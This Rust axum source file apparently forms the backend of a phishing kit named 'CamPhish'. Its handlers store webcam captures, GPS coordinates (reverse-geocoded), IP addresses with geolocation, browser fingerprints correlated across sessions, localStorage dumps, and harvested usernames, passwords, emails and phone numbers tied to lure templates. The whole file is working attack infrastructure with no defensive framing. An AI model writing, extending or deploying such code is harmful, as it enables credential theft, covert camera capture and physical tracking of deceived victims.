use crate::AppState;
use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde::Deserialize;
use std::sync::Arc;
use base64::Engine;

#[derive(Deserialize)]
pub struct ImagePayload {
    cat: String,
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    capture_method: Option<String>,
}

#[derive(Deserialize)]
pub struct LocationPayload {
    lat: f64,
    lon: f64,
    #[serde(default)]
    acc: Option<f64>,
    #[serde(default)]
    altitude: Option<f64>,
    #[serde(default)]
    heading: Option<f64>,
    #[serde(default)]
    speed: Option<f64>,
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct IpPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    client_ip: Option<String>,
}

#[derive(Deserialize)]
pub struct FingerprintPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(flatten)]
    extra: serde_json::Value,
}

#[derive(Deserialize)]
pub struct EventPayload {
    #[serde(default)]
    session: Option<String>,
    event_type: String,
    #[serde(default)]
    event_data: Option<serde_json::Value>,
}

#[derive(Deserialize)]
pub struct StoragePayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(flatten)]
    extra: serde_json::Value,
}

#[derive(Deserialize)]
pub struct CredentialPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    template_id: Option<String>,
    #[serde(default)]
    username: Option<String>,
    #[serde(default)]
    password: Option<String>,
    #[serde(default)]
    email: Option<String>,
    #[serde(default)]
    phone: Option<String>,
}

fn sanitize_session(session: &str) -> String {
    session.chars()
        .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
        .take(64)
        .collect()
}

fn get_session(session: &Option<String>) -> String {
    let raw = session.clone().filter(|s| !s.is_empty()).unwrap_or_else(|| "default".into());
    sanitize_session(&raw)
}

pub async fn receive_image(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<ImagePayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let filtered = payload.cat.split(',').nth(1).unwrap_or("");
    let raw = base64::engine::general_purpose::STANDARD.decode(filtered)
        .map_err(|_| StatusCode::BAD_REQUEST)?;
    if raw.is_empty() { return Err(StatusCode::BAD_REQUEST); }

    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S%f"));
    let file_path = format!("{}/captures/{}", state.data_dir, filename);
    let method = payload.capture_method.unwrap_or_else(|| "canvas".into());

    std::fs::write(&file_path, &raw).map_err(|e| { tracing::error!("File write failed: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    sqlx::query(
        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, capture_method, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&filename)
    .bind(raw.len() as i64).bind(&file_path).bind(&method).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite capture insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    let _ = sqlx::query("UPDATE templates SET total_camera_grants = total_camera_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
        .bind(&session_id).execute(&state.pool).await;
    log_event(&state, &session_id, "camera_capture", serde_json::json!({"filename": filename, "size": raw.len(), "method": method})).await;
    tracing::info!("📸 Capture: {} ({} bytes, {}) session={}", filename, raw.len(), method, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_location(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<LocationPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let now = chrono::Utc::now().timestamp();

    // Deduplicate: skip if same lat/lon within 60 seconds
    let recent: Option<(i64,)> = sqlx::query_as(
        "SELECT created_at FROM locations WHERE session_id = ? AND ABS(latitude - ?) < 0.0001 AND ABS(longitude - ?) < 0.0001 AND created_at > ? ORDER BY created_at DESC LIMIT 1"
    ).bind(&session_id).bind(payload.lat).bind(payload.lon).bind(now - 60)
    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if recent.is_some() {
        tracing::debug!("📍 Duplicate location skipped for session {}", session_id);
        return Ok(StatusCode::OK);
    }

    let loc_id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, altitude, heading, speed, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&loc_id).bind(&session_id)
    .bind(payload.lat).bind(payload.lon).bind(payload.acc)
    .bind(payload.altitude).bind(payload.heading).bind(payload.speed).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite location insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    // Reverse geocode in background
    let pool = state.pool.clone();
    let http = state.http.clone();
    let lat = payload.lat;
    let lon = payload.lon;
    tokio::spawn(async move {
        let url = format!(
            "https://nominatim.openstreetmap.org/reverse?lat={}&lon={}&format=json&addressdetails=1&zoom=16",
            lat, lon
        );
        match http.get(&url).header("User-Agent", "CamPhish/2.1").send().await {
            Ok(r) if r.status().is_success() => {
                if let Ok(geo) = r.json::<serde_json::Value>().await {
                    let addr = geo.get("display_name").and_then(|v| v.as_str()).unwrap_or("");
                    if !addr.is_empty() {
                        let _ = sqlx::query("UPDATE locations SET address = ? WHERE id = ?")
                            .bind(addr).bind(&loc_id).execute(&pool).await;
                    }
                }
            }
            _ => tracing::debug!("Nominatim reverse geocode failed for {}/{}", lat, lon),
        }
    });

    let _ = sqlx::query("UPDATE templates SET total_location_grants = total_location_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
        .bind(&session_id).execute(&state.pool).await;
    log_event(&state, &session_id, "location_granted", serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc})).await;
    tracing::info!("📍 Location: {}, {} session={}", payload.lat, payload.lon, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_ip(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<IpPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&body.session);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    // Deduplicate: skip if same IP+session within 5 minutes
    let recent: Option<(i64,)> = sqlx::query_as(
        "SELECT created_at FROM ip_logs WHERE session_id = ? AND ip_address = ? AND created_at > ? ORDER BY created_at DESC LIMIT 1"
    ).bind(&session_id).bind(&ip).bind(now - 300)
    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if recent.is_some() {
        tracing::debug!("🌐 Duplicate IP skipped for session {}", session_id);
        return Ok(StatusCode::OK);
    }

    let client_local_ip = body.client_ip.clone().unwrap_or_default();
    let ip_id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&ip_id).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite IP insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    if !client_local_ip.is_empty() {
        let _ = sqlx::query("UPDATE ip_logs SET geo_data = ? WHERE id = ?")
            .bind(serde_json::json!({"client_ip": client_local_ip}).to_string())
            .bind(&ip_id)
            .execute(&state.pool).await;
    }

    // IP geolocation in background (skip private/local IPs)
    if !ip.starts_with("10.") && !ip.starts_with("192.168.") && !ip.starts_with("172.16.") && !ip.starts_with("127.") && ip != "unknown" {
        let pool = state.pool.clone();
        let http = state.http.clone();
        let ip_clone = ip.clone();
        tokio::spawn(async move {
            let url = format!("http://ip-api.com/json/{}?fields=status,message,city,region,country,lat,lon,isp,org,as,query", ip_clone);
            match http.get(&url).send().await {
                Ok(r) if r.status().is_success() => {
                    if let Ok(geo) = r.json::<serde_json::Value>().await {
                        if geo.get("status").and_then(|s| s.as_str()) == Some("success") {
                            let city = geo.get("city").and_then(|v| v.as_str()).unwrap_or("");
                            let country = geo.get("country").and_then(|v| v.as_str()).unwrap_or("");
                            let _ = sqlx::query("UPDATE ip_logs SET city = ?, country = ?, geo_data = ? WHERE id = ?")
                                .bind(city).bind(country).bind(geo.to_string()).bind(&ip_id)
                                .execute(&pool).await;
                        }
                    }
                }
                _ => tracing::debug!("IP geolocation failed for {}", ip_clone),
            }
        });
    }

    log_event(&state, &session_id, "page_visit", serde_json::json!({"ip": ip, "device": device, "browser": browser})).await;
    tracing::info!("🌐 IP: {} ({} on {}) session={}", ip, browser, os, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_fingerprint(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<FingerprintPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();
    let _data_str = serde_json::to_string(&payload.extra).unwrap_or_default();

    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, canvas_fingerprint, webgl_fingerprint, font_list, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os)
    .bind(payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()))
    .bind(payload.extra.get("webgl_fingerprint").and_then(|v| v.as_str()))
    .bind(payload.extra.get("font_list").and_then(|v| v.as_str()))
    .bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite fingerprint insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    // Cross-session correlation
    if let Some(canvas_fp) = payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()) {
        let matches: Vec<(String,)> = sqlx::query_as(
            "SELECT DISTINCT session_id FROM ip_logs WHERE canvas_fingerprint = ? AND session_id != ?"
        ).bind(canvas_fp).bind(&session_id).fetch_all(&state.pool).await.unwrap_or_default();

        if !matches.is_empty() {
            let other_sessions: Vec<String> = matches.into_iter().map(|(s,)| s).collect();
            tracing::warn!("🔗 Cross-session correlation: {} matches sessions: {:?}", canvas_fp, other_sessions);
            log_event(&state, &session_id, "cross_session_match", serde_json::json!({"matched_sessions": other_sessions})).await;
        }
    }

    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": payload.extra.get("canvas_fingerprint").is_some()})).await;
    tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_event(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<EventPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let data_str = payload.event_data.map(|d| serde_json::to_string(&d).unwrap_or_default());
    let now = chrono::Utc::now().timestamp();

    sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
        .bind(&payload.event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite event insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    Ok(StatusCode::OK)
}

pub async fn receive_storage(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<StoragePayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&body.session);
    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let data_str = serde_json::to_string(&body.extra).unwrap_or_default();

    sqlx::query("INSERT INTO storage_dumps (id, session_id, data, ip_address, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(&id).bind(&session_id).bind(&data_str).bind(&ip).bind(now)
        .execute(&state.pool).await.map_err(|e| { tracing::error!("Storage insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "storage_captured", serde_json::json!({
        "keys": body.extra.get("localStorage_keys").or(Some(&serde_json::Value::Null)),
    })).await;

    tracing::info!("💾 Storage dump received for session {} (IP: {})", session_id, ip);
    Ok(StatusCode::OK)
}

pub async fn receive_credentials(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<CredentialPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let now = chrono::Utc::now().timestamp();

    sqlx::query(
        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
    .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
    .bind(&payload.email).bind(&payload.phone).bind(&ip).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("Credential insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "credentials_captured", serde_json::json!({
        "template": payload.template_id,
        "username": payload.username.is_some(),
    })).await;

    tracing::info!("🔑 Credentials: {} session={}", payload.username.as_deref().unwrap_or("?"), session_id);
    Ok(StatusCode::OK)
}

async fn log_event(state: &AppState, session_id: &str, event_type: &str, data: serde_json::Value) {
    let now = chrono::Utc::now().timestamp();
    let data_str = serde_json::to_string(&data).unwrap_or_default();
    let _ = sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(session_id)
        .bind(event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await;
}

pub fn check_rate_limit(
    state: &AppState,
    ip: &str,
    max_requests: u32,
    window_secs: u64,
) -> bool {
    let mut limiter = state.rate_limiter.lock().unwrap();
    let now = std::time::Instant::now();
    let entry = limiter.entry(ip.to_string()).or_insert((0, now));
    if entry.1.elapsed().as_secs() > window_secs {
        *entry = (1, now);
        true
    } else {
        entry.0 += 1;
        if entry.0 > max_requests {
            false
        } else {
            true
        }
    }
}

fn extract_ip(headers: &HeaderMap) -> String {
    headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| s.split(',').next())
        .or_else(|| headers.get("x-real-ip").and_then(|v| v.to_str().ok()))
        .unwrap_or("unknown")
        .trim()
        .to_string()
}

fn parse_ua(ua: &str) -> (String, String, String) {
    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") { "Mobile" }
        else if ua.contains("Tablet") || ua.contains("iPad") { "Tablet" }
        else { "Desktop" };
    let browser = if ua.contains("Edg/") { "Edge" }
        else if ua.contains("Chrome/") { "Chrome" }
        else if ua.contains("Firefox/") { "Firefox" }
        else if ua.contains("Safari/") && !ua.contains("Chrome") { "Safari" }
        else { "Unknown" };
    let os = if ua.contains("Windows NT") { "Windows" }
        else if ua.contains("Mac OS X") { "macOS" }
        else if ua.contains("Android") { "Android" }
        else if ua.contains("iPhone") || ua.contains("iPad") || ua.contains("iOS") { "iOS" }
        else if ua.contains("Linux") { "Linux" }
        else { "Unknown" };
    (device.into(), browser.into(), os.into())
}
